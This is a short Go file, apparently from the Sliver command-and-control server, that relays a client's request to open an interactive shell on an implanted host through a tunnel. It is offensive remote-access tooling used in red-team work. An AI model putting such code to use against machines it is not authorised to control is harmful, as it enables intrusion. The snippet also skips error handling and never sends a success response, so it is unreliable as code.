package rpc

import (
	sliverpb "sliver/protobuf/sliver"
	"sliver/server/core"

	"github.com/golang/protobuf/proto"
)

func rpcShell(req []byte, resp RPCResponse) {
	shellReq := &sliverpb.ShellReq{}
	proto.Unmarshal(req, shellReq)

	sliver := core.Hive.Sliver(shellReq.SliverID)
	tunnel := core.Tunnels.Tunnel(shellReq.TunnelID)

	startShell, err := proto.Marshal(&sliverpb.ShellReq{
		EnablePTY: shellReq.EnablePTY,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		resp([]byte{}, err)
		return
	}

	data, err := sliver.Request(sliverpb.MsgShellReq, defaultTimeout, startShell)
	if err != nil {
		resp(data, err)
		return
	}

}
